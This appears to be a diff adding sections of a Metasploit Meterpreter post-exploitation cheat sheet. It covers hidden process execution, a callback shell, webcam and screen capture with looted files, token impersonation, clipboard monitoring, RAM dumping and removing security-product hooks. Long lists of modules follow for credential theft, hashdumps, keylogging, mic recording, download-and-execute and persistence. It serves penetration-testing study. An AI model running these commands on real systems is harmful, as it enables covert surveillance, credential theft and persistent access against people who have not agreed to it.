+#### 2.1.5 - Execute Process
+
+##### 2.1.5.1 - Help Menu
+
+```
+meterpreter > execute -h
+Usage: execute -f file [options]
+Executes a command on the remote machine.
+
+OPTIONS:
+
+    -a   The arguments to pass to the command.
+    -c   Channelized I/O (required for interaction).
+    -d   The 'dummy' executable to launch when using -m.
+    -f   The executable command to run.
+    -h   Help menu.
+    -H   Create the process hidden from view.
+    -i   Interact with the process after creating it.
+    -k   Execute process on the meterpreters current desktop
+    -m   Execute from memory.
+    -p   Execute process in a pty (if available on target platform)
+    -s   Execute process in a given session as the session user
+    -t   Execute process with currently impersonated thread token
+    -z   Execute process in a subshell
+```
+
+##### 2.1.5.2 - Usage
+
+* **Spawn Callback Shell**
+
+`meterpreter > execute -Hicf shell.exe`
+
+* **Dummy Process**
+
+`meterpreter > execute -Hicmd svchost.exe -f /usr/share/windows-resources/wce/wce64.exe -a "-h"`
+
+#### 2.1.6 - WireTap
+
+##### 2.1.6.1 - Webcam
+
+`meterpreter > webcam_list`
+
+`meterpreter > webcam_snap -h`
+
+`meterpreter > webcam_snap -i <device_ID> -p /path/to/file.png`
+
+`meterpreter > webcam_stream -h`
+
+##### 2.1.6.2 - Screenshots
+
+1. **Screenshot**
+ 
+```
+meterpreter > screenshot -h
+Usage: screenshot [options]
+
+Grab a screenshot of the current interactive desktop.
+
+OPTIONS:
+
+    -h   Help Banner.
+    -p   The JPEG image path (Default: 'jevmzGjE.jpeg')
+    -q   The JPEG image quality (Default: '50')
+    -v   Automatically view the JPEG image (Default: 'false')
+
+meterpreter > screenshot -p /home/user/pic.jpeg -q 100
+
+meterpreter > screenshare -h
+Usage: screenshare [options]
+
+View the current interactive desktop in real time.
+
+OPTIONS:
+
+    -d   The stream duration in seconds (Default: 1800)
+    -h   Help Banner.
+    -q   The JPEG image quality (Default: '50')
+    -s   The stream file path (Default: 'FteINQtk.jpeg')
+    -t   The stream player path (Default: tFLOibzd.html)
+    -v   Automatically view the stream (Default: 'true')
+```
+
+2. **Screenshare**
+
+```
+meterpreter > screenshare
+[*] Preparing player...
+[*] Opening player at: /home/user/CTslvACC.html
+[*] Streaming...
+
+msf exploit(multi/handler) > use post/windows/gather/screen_spy
+
+msf post(windows/gather/screen_spy) > options
+
+Module options (post/windows/gather/screen_spy):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   COUNT             6                yes       Number of screenshots to collect
+   DELAY             5                yes       Interval between screenshots in seconds
+   PID                                no        PID to migrate into before taking the screenshots
+   RECORD            true             yes       Record all screenshots to disk by saving them to loot
+   SESSION                            yes       The session to run this module on
+   VIEW_SCREENSHOTS  false            no        View screenshots automatically
+```
+
+3. **`screen_spy` post exploitation module**
+
+```
+meterpreter > run post/windows/gather/screen_spy
+
+[*] Capturing 6 screenshots with a delay of 5 seconds
+[*] Screen Spying Complete
+[*] run loot -t screenspy.screenshot to see file locations of your newly acquired loot
+
+meterpreter > background
+[*] Backgrounding session 1...
+
+msf post(windows/gather/screen_spy) > loot -S screenspy.screenshot
+
+Loot
+====
+
+host       service  type                  name              content    info        path
+----       -------  ----                  ----              -------    ----        ----
+10.0.2.15           screenspy.screenshot  screenshot.0.jpg  image/jpg  Screenshot  /root/.msf4/loot/20220515200113_default_10.0.2.15_screenspy.screen_984207.jpg
+10.0.2.15           screenspy.screenshot  screenshot.1.jpg  image/jpg  Screenshot  /root/.msf4/loot/20220515200118_default_10.0.2.15_screenspy.screen_091374.jpg
+10.0.2.15           screenspy.screenshot  screenshot.2.jpg  image/jpg  Screenshot  /root/.msf4/loot/20220515200123_default_10.0.2.15_screenspy.screen_996060.jpg
+10.0.2.15           screenspy.screenshot  screenshot.3.jpg  image/jpg  Screenshot  /root/.msf4/loot/20220515200128_default_10.0.2.15_screenspy.screen_330156.jpg
+10.0.2.15           screenspy.screenshot  screenshot.4.jpg  image/jpg  Screenshot  /root/.msf4/loot/20220515200141_default_10.0.2.15_screenspy.screen_723895.jpg
+10.0.2.15           screenspy.screenshot  screenshot.5.jpg  image/jpg  Screenshot  /root/.msf4/loot/20220515200153_default_10.0.2.15_screenspy.screen_495403.jpg
+```
+
+#### 2.1.7 - Pseudo Shell
+
+```
+meterpreter > run post/linux/manage/pseudo_shell
+user@debian:/home/user$ ?
+
+Commands Help
+==============
+
+        Command             Description
+        -------             -----------
+        ?                   Show current help
+        cat                 Show file contents
+        cd                  Change current directory
+        clear               Clear screen
+        exit                Exit the Pseudo-shell
+        groups              Show list of groups
+        help                Show current help
+        hostname            Show current Hostname
+        interfaces          Show list of network interfaces
+        ips                 Show list of current IP addresses
+        isroot?             Show if current user has root permisions
+        ls                  List files and folders in a directory
+        macs                Show list of MAC addresses
+        path                Show current directories included in $PATH enviroment variable
+        pwd                 Show current PATH
+        shell               Show current SHELL
+        tcp_ports           Show list of listen TCP ports
+        udp_ports           Show list of listen UDP ports
+        users               Show list of users
+        whoami              Show current user
+
+user@debian:/home/user$
+```
+
+#### 2.1.8 - Miscellaneous
+
+```
+meterpreter > get_timeouts
+Session Expiry  : @ 2022-05-21 17:23:58
+Comm Timeout    : 300 seconds
+Retry Total Time: 3600 seconds
+Retry Wait Time : 10 seconds
+```
+
+### 2.2 - Extensions
+
+#### 2.2.1 - Espia
+
+##### 2.2.1.1 - Help Menu
+
+```
+meterpreter > load espia
+
+Espia Commands
+==============
+
+    Command       Description
+    -------       -----------
+    screengrab    Attempt to grab screen shot from process's active desktop
+```
+
+##### 2.2.1.2 - WireTap
+
+`meterpreter > screengrab -h`
+
+#### 2.2.2 - Incognito
+
+##### 2.2.2.1 - Help Menu
+
+```
+meterpreter > load incognito
+
+Incognito Commands
+==================
+
+    Command              Description
+    -------              -----------
+    add_group_user       Attempt to add a user to a global group with all tokens
+    add_localgroup_user  Attempt to add a user to a local group with all tokens
+    add_user             Attempt to add a user with all tokens
+    impersonate_token    Impersonate specified token
+    list_tokens          List tokens available under current user context
+    snarf_hashes         Snarf challenge/response hashes for every token
+```
+
+##### 2.2.2.2 - Token Impersonation
+
+`meterpreter > rev2self`
+
+#### 2.2.3 - ExtAPI
+
+TODO: Provide usage examples
+
+```
+meterpreter > load extapi
+
+Extapi: Window Management Commands
+==================================
+
+    Command       Description
+    -------       -----------
+    window_enum   Enumerate all current open windows
+
+
+Extapi: Service Management Commands
+===================================
+
+    Command          Description
+    -------          -----------
+    service_control  Control a single service (start/pause/resume/stop/restart)
+    service_enum     Enumerate all registered Windows services
+    service_query    Query more detail about a specific Windows service
+
+
+Extapi: Clipboard Management Commands
+=====================================
+
+    Command                   Description
+    -------                   -----------
+    clipboard_get_data        Read the target's current clipboard (text, files, images)
+    clipboard_monitor_dump    Dump all captured clipboard content
+    clipboard_monitor_pause   Pause the active clipboard monitor
+    clipboard_monitor_purge   Delete all captured clipboard content without dumping it
+    clipboard_monitor_resume  Resume the paused clipboard monitor
+    clipboard_monitor_start   Start the clipboard monitor
+    clipboard_monitor_stop    Stop the clipboard monitor
+    clipboard_set_text        Write text to the target's clipboard
+
+
+Extapi: ADSI Management Commands
+================================
+
+    Command                      Description
+    -------                      -----------
+    adsi_computer_enum           Enumerate all computers on the specified domain.
+    adsi_dc_enum                 Enumerate all domain controllers on the specified domain.
+    adsi_domain_query            Enumerate all objects on the specified domain that match a filter.
+    adsi_group_enum              Enumerate all groups on the specified domain.
+    adsi_nested_group_user_enum  Recursively enumerate users who are effectively members of the group specified.
+    adsi_user_enum               Enumerate all users on the specified domain.
+
+
+Extapi: WMI Querying Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    wmi_query     Perform a generic WMI query and return the results
+```
+
+#### 2.2.4 - Powershell
+
+```
+meterpreter > load powershell
+
+Powershell Commands
+===================
+
+    Command                    Description
+    -------                    -----------
+    powershell_execute         Execute a Powershell command string
+    powershell_import          Import a PS1 script or .NET Assembly DLL
+    powershell_session_remove  Remove/clear a session (other than default)
+    powershell_shell           Create an interactive Powershell prompt
+```
+
+#### 2.2.5 - Python
+
+```
+meterpreter > load python
+
+Python Commands
+===============
+
+    Command         Description
+    -------         -----------
+    python_execute  Execute a python command string
+    python_import   Import/run a python file or module
+    python_reset    Resets/restarts the Python interpreter
+```
+
+#### 2.2.6 - PeInjector
+
+##### 2.2.6.1 - Help Menu
+
+```
+meterpreter > load peinjector
+
+Peinjector Commands
+===================
+
+    Command       Description
+    -------       -----------
+    injectpe      Inject a shellcode into a given executable
+
+Unhook Commands
+===============
+
+    Command       Description
+    -------       -----------
+    unhook_pe     Unhook the current process
+    
+    
+meterpreter > unhook_pe -h
+Usage: unhook_pe
+
+Removes any runtime hooks placed by PSPs
+
+OPTIONS:
+
+    -h  Help banner
+```
+
+##### 2.2.6.2 - Usage
+
+* **Unhook the API**
+
+```
+meterpreter > unhook_pe
+[+] Command execution completed:
+[0, 0, nil]
+```
+
+#### 2.2.7 - Winpmem
+
+TODO: Provide usage examples
+
+```
+meterpreter > load winpmem
+
+Winpmem Commands
+================
+
+    Command       Description
+    -------       -----------
+    dump_ram      Dump victim RAM
+```
+
+#### 2.2.8 - LANAttacks
+
+TODO: Provide usage examples
+
+```
+meterpreter > load lanattacks
+
+Lanattacks: DHCP Commands
+=========================
+
+    Command            Description
+    -------            -----------
+    dhcp_load_options  Load DHCP optionis from a datastore
+    dhcp_log           Log DHCP server activity
+    dhcp_reset         Reset the DHCP server
+    dhcp_set_option    Set a DHCP server option
+    dhcp_start         Start the DHCP server
+    dhcp_stop          Stop the DHCP server
+
+
+Lanattacks: TFTP Commands
+=========================
+
+    Command        Description
+    -------        -----------
+    tftp_add_file  Add a file to the TFTP server
+    tftp_reset     Reset the TFTP server
+    tftp_start     Start the TFTP server
+    tftp_stop      Stop the TFTP server
+```
+
+#### 2.2.9 - Sniffer
+
+```
+meterpreter > load sniffer
+
+Sniffer Commands
+================
+
+    Command             Description
+    -------             -----------
+    sniffer_dump        Retrieve captured packet data to PCAP file
+    sniffer_interfaces  Enumerate all sniffable network interfaces
+    sniffer_release     Free captured packets on a specific interface instead of downloading them
+    sniffer_start       Start packet capture on a specific interface
+    sniffer_stats       View statistics of an active capture
+    sniffer_stop        Stop packet capture on a specific interface
+```
+
+### 2.3 - Meterpreter Scripts and Modules (TODO)
+
+#### 2.3.1 - Windows Gather Modules
+
+run post/windows/gather/ad_to_sqlite
+
+run post/windows/gather/credentials/wsftp_client
+
+run post/windows/gather/avast_memory_dump
+
+run post/windows/gather/credentials/xchat
+
+run post/windows/gather/bitcoin_jacker
+
+run post/windows/gather/credentials/xshell_xftp_password
+
+run post/windows/gather/bitlocker_fvek
+
+run post/windows/gather/dnscache_dump
+
+run post/windows/gather/dumplinks
+
+run post/windows/gather/enum_ad_bitlocker
+
+run post/windows/gather/enum_ad_computers
+
+run post/windows/gather/credentials/aim
+
+run post/windows/gather/enum_ad_groups
+
+run post/windows/gather/credentials/avira_password
+
+run post/windows/gather/enum_ad_managedby_groups
+
+run post/windows/gather/credentials/bulletproof_ftp
+
+run post/windows/gather/enum_ad_service_principal_names
+
+run post/windows/gather/enum_ad_to_wordlist
+
+run post/windows/gather/credentials/comodo
+
+run post/windows/gather/enum_ad_user_comments
+
+run post/windows/gather/credentials/coolnovo
+
+run post/windows/gather/enum_ad_users
+
+run post/windows/gather/credentials/coreftp
+
+run post/windows/gather/enum_applications
+
+run post/windows/gather/enum_artifacts
+
+run post/windows/gather/credentials/digsby
+
+run post/windows/gather/enum_av_excluded
+
+run post/windows/gather/credentials/domain_hashdump
+
+run post/windows/gather/enum_chocolatey_applications
+
+run post/windows/gather/credentials/dynazip_log
+
+run post/windows/gather/enum_chrome
+
+run post/windows/gather/credentials/dyndns
+
+run post/windows/gather/enum_computers
+
+run post/windows/gather/credentials/enum_cred_store
+
+run post/windows/gather/enum_db
+
+run post/windows/gather/credentials/enum_laps
+
+run post/windows/gather/enum_devices
+
+run post/windows/gather/credentials/enum_picasa_pwds
+
+run post/windows/gather/enum_dirperms
+
+run post/windows/gather/credentials/epo_sql
+
+run post/windows/gather/enum_domain
+
+run post/windows/gather/credentials/filezilla_server
+
+run post/windows/gather/enum_domain_group_users
+
+run post/windows/gather/credentials/flashfxp
+
+run post/windows/gather/enum_domain_tokens
+
+run post/windows/gather/credentials/flock
+
+run post/windows/gather/enum_domain_users
+
+run post/windows/gather/credentials/ftpnavigator
+
+run post/windows/gather/enum_domains
+
+run post/windows/gather/credentials/ftpx
+
+run post/windows/gather/enum_emet
+
+run post/windows/gather/credentials/gadugadu
+
+run post/windows/gather/enum_files
+
+run post/windows/gather/credentials/gpp
+
+run post/windows/gather/enum_hostfile
+
+run post/windows/gather/credentials/heidisql
+
+run post/windows/gather/enum_hyperv_vms
+
+run post/windows/gather/credentials/icq
+
+run post/windows/gather/enum_ie
+
+run post/windows/gather/credentials/idm
+
+run post/windows/gather/enum_logged_on_users
+
+run post/windows/gather/credentials/ie
+
+run post/windows/gather/enum_ms_product_keys
+
+run post/windows/gather/credentials/imail
+
+run post/windows/gather/enum_muicache
+
+run post/windows/gather/credentials/imvu
+
+run post/windows/gather/enum_onedrive
+
+run post/windows/gather/credentials/incredimail
+
+run post/windows/gather/credentials/kakaotalk
+
+run post/windows/gather/credentials/kmeleon
+
+run post/windows/gather/enum_prefetch
+
+run post/windows/gather/credentials/line
+
+run post/windows/gather/enum_proxy
+
+run post/windows/gather/credentials/maxthon
+
+run post/windows/gather/enum_putty_saved_sessions
+
+run post/windows/gather/credentials/mcafee_vse_hashdump
+
+run post/windows/gather/enum_services
+
+run post/windows/gather/credentials/mdaemon_cred_collector
+
+run post/windows/gather/enum_shares
+
+run post/windows/gather/credentials/meebo
+
+run post/windows/gather/enum_snmp
+
+run post/windows/gather/credentials/miranda
+
+run post/windows/gather/enum_termserv
+
+run post/windows/gather/credentials/mremote
+
+run post/windows/gather/enum_tokens
+
+run post/windows/gather/credentials/mssql_local_hashdump
+
+run post/windows/gather/enum_tomcat
+
+run post/windows/gather/credentials/nimbuzz
+
+run post/windows/gather/enum_trusted_locations
+
+run post/windows/gather/credentials/opera
+
+run post/windows/gather/enum_unattend
+
+run post/windows/gather/credentials/operamail
+
+run post/windows/gather/exchange
+
+run post/windows/gather/credentials/outlook
+
+run post/windows/gather/file_from_raw_ntfs
+
+run post/windows/gather/credentials/postbox
+
+run post/windows/gather/forensics/browser_history
+
+run post/windows/gather/credentials/pulse_secure
+
+run post/windows/gather/forensics/duqu_check
+
+run post/windows/gather/credentials/purevpn_cred_collector
+
+run post/windows/gather/forensics/enum_drives
+
+run post/windows/gather/credentials/qq
+
+run post/windows/gather/forensics/fanny_bmp_check
+
+run post/windows/gather/credentials/razer_synapse
+
+run post/windows/gather/forensics/imager
+
+run post/windows/gather/credentials/razorsql
+
+run post/windows/gather/forensics/nbd_server
+
+run post/windows/gather/credentials/rdc_manager_creds
+
+run post/windows/gather/forensics/recovery_files
+
+run post/windows/gather/credentials/safari
+
+run post/windows/gather/credentials/seamonkey
+
+run post/windows/gather/local_admin_search_enum
+
+run post/windows/gather/credentials/securecrt
+
+run post/windows/gather/lsa_secrets
+
+run post/windows/gather/credentials/skype
+
+run post/windows/gather/make_csv_orgchart
+
+run post/windows/gather/credentials/smartermail
+
+run post/windows/gather/memory_dump
+
+run post/windows/gather/credentials/smartftp
+
+run post/windows/gather/memory_grep
+
+run post/windows/gather/credentials/spark_im
+
+run post/windows/gather/netlm_downgrade
+
+run post/windows/gather/credentials/srware
+
+run post/windows/gather/credentials/sso
+
+run post/windows/gather/credentials/steam
+
+run post/windows/gather/outlook
+
+run post/windows/gather/credentials/tango
+
+run post/windows/gather/phish_windows_credentials
+
+run post/windows/gather/credentials/teamviewer_passwords
+
+run post/windows/gather/psreadline_history
+
+run post/windows/gather/credentials/thunderbird
+
+run post/windows/gather/resolve_sid
+
+run post/windows/gather/credentials/tlen
+
+run post/windows/gather/reverse_lookup
+
+run post/windows/gather/credentials/tortoisesvn
+
+run post/windows/gather/credentials/total_commander
+
+run post/windows/gather/credentials/trillian
+
+run post/windows/gather/tcpnetstat
+
+run post/windows/gather/credentials/viber
+
+run post/windows/gather/usb_history
+
+run post/windows/gather/credentials/vnc
+
+run post/windows/gather/credentials/windows_sam_hivenightmare
+
+run post/windows/gather/word_unc_injector
+
+run post/windows/gather/credentials/windowslivemail
+
+#### 2.3.2 - Windows Manage Modules
+
+run post/windows/manage/archmigrate
+
+run post/windows/manage/remove_host
+
+run post/windows/manage/rid_hijack
+
+run post/windows/manage/clone_proxy_settings
+
+run post/windows/manage/mssql_local_auth_bypass
+
+run post/windows/manage/rpcapd_start
+
+run post/windows/manage/dell_memory_protect
+
+run post/windows/manage/multi_meterpreter_inject
+
+run post/windows/manage/download_exec
+
+run post/windows/manage/nbd_server
+
+run post/windows/manage/driver_loader
+
+run post/windows/manage/peinjector
+
+run post/windows/manage/shellcode_inject
+
+run post/windows/manage/enable_support_account
+
+run post/windows/manage/sshkey_persistence
+
+run post/windows/manage/exec_powershell
+
+run post/windows/manage/powershell/build_net_code
+
+run post/windows/manage/sticky_keys
+
+run post/windows/manage/execute_dotnet_assembly
+
+run post/windows/manage/powershell/exec_powershell
+
+run post/windows/manage/forward_pageant
+
+run post/windows/manage/powershell/load_script
+
+run post/windows/manage/vss
+
+run post/windows/manage/hashcarve
+
+run post/windows/manage/pptp_tunnel
+
+run post/windows/manage/wdigest_caching
+
+run post/windows/manage/ie_proxypac
+
+run post/windows/manage/priv_migrate
+
+run post/windows/manage/webcam
+
+run post/windows/manage/inject_ca
+
+run post/windows/manage/pxeexploit
+
+run post/windows/manage/reflective_dll_inject
+
+#### 2.3.3 - Multi Modules
+
+run post/multi/escalate/aws_create_iam_user
+
+run post/multi/gather/jboss_gather
+
+run post/multi/general/close
+
+run post/multi/escalate/cups_root_file_read
+
+run post/multi/gather/jenkins_gather
+
+run post/multi/general/execute
+
+run post/multi/gather/lastpass_creds
+
+run post/multi/general/wall
+
+run post/multi/gather/apple_ios_backup
+
+run post/multi/gather/maven_creds
+
+run post/multi/manage/autoroute
+
+run post/multi/gather/aws_ec2_instance_metadata
+
+run post/multi/gather/multi_command
+
+run post/multi/manage/dbvis_add_db_admin
+
+run post/multi/gather/aws_keys
+
+run post/multi/gather/netrc_creds
+
+run post/multi/manage/dbvis_query
+
+run post/multi/gather/check_malware
+
+run post/multi/manage/fileshare
+
+run post/multi/gather/chrome_cookies
+
+run post/multi/gather/pgpass_creds
+
+run post/multi/manage/hsts_eraser
+
+run post/multi/gather/dbvis_enum
+
+run post/multi/gather/pidgin_cred
+
+run post/multi/manage/multi_post
+
+run post/multi/gather/dns_bruteforce
+
+run post/multi/gather/ping_sweep
+
+run post/multi/manage/open
+
+run post/multi/gather/dns_reverse_lookup
+
+run post/multi/gather/remmina_creds
+
+run post/multi/manage/play_youtube
+
+run post/multi/gather/dns_srv_lookup
+
+run post/multi/gather/resolve_hosts
+
+run post/multi/manage/record_mic
+
+run post/multi/gather/docker_creds
+
+run post/multi/gather/rsyncd_creds
+
+run post/multi/manage/screensaver
+
+run post/multi/gather/enum_hexchat
+
+run post/multi/gather/rubygems_api_key
+
+run post/multi/manage/screenshare
+
+run post/multi/gather/enum_software_versions
+
+run post/multi/gather/run_console_rc_file
+
+run post/multi/manage/set_wallpaper
+
+run post/multi/gather/enum_vbox
+
+run post/multi/gather/saltstack_salt
+
+run post/multi/manage/shell_to_meterpreter
+
+run post/multi/gather/env
+
+run post/multi/gather/skype_enum
+
+run post/multi/manage/sudo
+
+run post/multi/gather/fetchmailrc_creds
+
+run post/multi/gather/ssh_creds
+
+run post/multi/manage/system_session
+
+run post/multi/gather/filezilla_client_cred
+
+run post/multi/gather/thunderbird_creds
+
+run post/multi/manage/upload_exec
+
+run post/multi/gather/find_vmx
+
+run post/multi/gather/tomcat_gather
+
+run post/multi/manage/zip
+
+run post/multi/gather/firefox_creds
+
+run post/multi/gather/ubiquiti_unifi_backup
+
+run post/multi/recon/local_exploit_suggester
+
+run post/multi/gather/gpg_creds
+
+run post/multi/gather/unix_cached_ad_hashes
+
+run post/multi/recon/multiport_egress_traffic
+
+run post/multi/gather/grub_creds
+
+run post/multi/gather/unix_kerberos_tickets
+
+run post/multi/recon/sudo_commands
+
+run post/multi/gather/irssi_creds
+
+run post/multi/gather/wlan_geolocate
+
+run post/multi/sap/smdagent_get_properties
+
+#### 2.3.4 - Linux Modules
+
+run post/linux/busybox/enum_connections
+
+run post/linux/gather/enum_commands
+
+run post/linux/gather/hashdump
+
+run post/linux/busybox/enum_hosts
+
+run post/linux/gather/enum_configs
+
+run post/linux/gather/mount_cifs_creds
+
+run post/linux/busybox/jailbreak
+
+run post/linux/gather/enum_containers
+
+run post/linux/gather/openvpn_credentials
+
+run post/linux/busybox/ping_net
+
+run post/linux/gather/enum_nagios_xi
+
+run post/linux/gather/phpmyadmin_credsteal
+
+run post/linux/busybox/set_dmz
+
+run post/linux/gather/enum_network
+
+run post/linux/gather/pptpd_chap_secrets
+
+run post/linux/busybox/set_dns
+
+run post/linux/gather/enum_protections
+
+run post/linux/gather/tor_hiddenservices
+
+run post/linux/busybox/smb_share_root
+
+run post/linux/gather/enum_psk
+
+run post/linux/manage/dns_spoofing
+
+run post/linux/busybox/wget_exec
+
+run post/linux/gather/enum_system
+
+run post/linux/manage/download_exec
+
+run post/linux/dos/xen_420_dos
+
+run post/linux/manage/geutebruck_post_exp
+
+run post/linux/gather/checkcontainer
+
+run post/linux/gather/gnome_commander_creds
+
+run post/linux/manage/iptables_removal
+
+run post/linux/gather/checkvm
+
+run post/linux/gather/gnome_keyring_dump
+
+run post/linux/gather/ecryptfs_creds
+
+run post/linux/gather/haserl_read
+
+run post/linux/manage/sshkey_persistence
+
+#### 2.3.5 - OSX Modules
+
+run post/osx/admin/say
+
+run post/osx/gather/enum_chicken_vnc_profile
+
+run post/osx/gather/safari_lastsession
+
+run post/osx/capture/keylog_recorder
+
+run post/osx/gather/enum_colloquy
+
+run post/osx/gather/vnc_password_osx
+
+run post/osx/capture/screen
+
+run post/osx/gather/enum_keychain
+
+run post/osx/manage/mount_share
+
+run post/osx/escalate/tccbypass
+
+run post/osx/gather/enum_messages
+
+run post/osx/manage/record_mic
+
+run post/osx/gather/apfs_encrypted_volume_passwd
+
+run post/osx/manage/sonic_pi
+
+run post/osx/gather/autologin_password
+
+run post/osx/gather/gitignore
+
+run post/osx/manage/vpn
+
+run post/osx/gather/enum_adium
+
+run post/osx/gather/hashdump
+
+run post/osx/manage/webcam
+
+run post/osx/gather/enum_airport
+
+run post/osx/gather/password_prompt_spoof
+
+#### 2.3.6 - Android Modules
+
+run post/android/gather/sub_info
+
+run post/android/manage/remove_lock
+
+run post/android/capture/screen
+
+run post/android/gather/wireless_ap
+
+run post/android/manage/remove_lock_root
+
+run post/android/gather/hashdump
+
+run post/android/local/koffee
+
+#### 2.3.7 - iOS Modules
+
+run post/apple_ios/gather/ios_image_gather
+
+run post/apple_ios/gather/ios_text_gather
+
+#### 2.3.8 - Others
+
+run autoroute
+
+run domain_list_gen
+
+run dumplinks
+
+run duplicate
+
+run enum_putty
+
+run enum_shares
+
+run enum_vmware
+
+run event_manager
+
+## References
+
+* [Metasploit for Pentester Migrate](https://www.hackingarticles.in/metasploit-for-pentester-migrate/)
+
+* [Penetration Testing in SMB Protocol Using Metasploit](https://www.hackingarticles.in/penetration-testing-in-smb-protocol-using-metasploit/)
+
+* [Metasploit Command](https://thehacktoday.com/metasploit-commands/)
+
+* [MSF Pentest Route](https://tyeyeah.github.io/2020/03/17/2020-03-17-MSF-Pentest-Route/)
+
+* [Metasploit Cheatsheet](https://hackersonlineclub.com/metasploit-tutorial-metasploit-cheatsheet/)
+
+* [Hacking Windows with Meterpreter](https://www.coengoedegebure.com/hacking-windows-with-meterpreter/)
